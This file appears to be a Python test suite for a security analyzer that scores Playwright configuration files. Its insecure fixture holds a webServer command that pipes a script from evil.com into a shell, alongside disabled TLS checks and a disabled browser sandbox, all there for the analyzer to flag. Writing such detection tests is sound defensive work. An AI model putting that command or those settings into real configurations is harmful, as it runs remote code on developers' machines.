"""Tests for PlaywrightAnalyzer."""

from pathlib import Path

from devai.playwright_analyzer import PlaywrightAnalyzer


INSECURE_PLAYWRIGHT_CONFIG = """\
import { defineConfig, devices } from '@playwright/test';

export default defineConfig({
  use: {
    baseURL: 'http://insecure.example.com',
    ignoreHTTPSErrors: true,
    bypassCSP: true,
    headless: false,
    screenshot: 'on',
    video: 'on',
    trace: 'on',
    storageState: '../.auth/session.json',
  },
  outputDir: '/tmp/playwright-results',
  projects: [
    {
      name: 'chromium',
      use: {
        ...devices['Desktop Chrome'],
        launchOptions: {
          args: ['--no-sandbox', '--disable-setuid-sandbox'],
          devtools: true,
        },
        executablePath: '/etc/chromium',
      },
    },
  ],
  webServer: {
    command: 'curl https://evil.com/setup.sh | sh',
    url: 'http://insecure.example.com',
  },
});
"""

HARDENED_PLAYWRIGHT = """\
import { defineConfig, devices } from '@playwright/test';

export default defineConfig({
  use: {
    baseURL: 'http://localhost:3000',
    ignoreHTTPSErrors: false,
    headless: true,
    trace: 'on-first-retry',
    screenshot: 'only-on-failure',
    video: 'off',
  },
  outputDir: 'test-results/',
  projects: [{ name: 'chromium', use: { ...devices['Desktop Chrome'] } }],
});
"""


class TestPlaywrightAnalyzer:
    def test_detects_insecure_playwright_config(self, tmp_path: Path):
        (tmp_path / "playwright.config.ts").write_text(
            INSECURE_PLAYWRIGHT_CONFIG, encoding="utf-8"
        )
        analyzer = PlaywrightAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        kinds = {f.kind for f in findings}
        assert "tls_bypass" in kinds
        assert "sandbox_disabled" in kinds
        assert "remote_debug" in kinds
        assert "insecure_http" in kinds
        assert "public_output_dir" in kinds
        assert "storage_state_outside" in kinds
        assert "curl_pipe_shell" in kinds
        assert analyzer.health_score() < 30.0

    def test_hardened_config_scores_well(self, tmp_path: Path):
        (tmp_path / "playwright.config.ts").write_text(
            HARDENED_PLAYWRIGHT, encoding="utf-8"
        )
        analyzer = PlaywrightAnalyzer(str(tmp_path))
        analyzer.analyze()
        assert analyzer.health_score() >= 90.0

    def test_no_config_returns_perfect_score(self, tmp_path: Path):
        analyzer = PlaywrightAnalyzer(str(tmp_path))
        analyzer.analyze()
        assert analyzer.health_score() == 100.0
        assert "none found" in analyzer.summary()

    def test_generate_hardened_template(self):
        template = PlaywrightAnalyzer(".").generate_hardened_template()
        assert "ignoreHTTPSErrors: false" in template
        assert "headless: true" in template

    def test_to_context(self, tmp_path: Path):
        (tmp_path / "playwright.config.js").write_text(
            "export default { use: { ignoreHTTPSErrors: true } };",
            encoding="utf-8",
        )
        analyzer = PlaywrightAnalyzer(str(tmp_path))
        context = analyzer.to_context()
        assert "Playwright analysis:" in context
        assert "tls_bypass" in context or "ignoreHTTPSErrors" in context
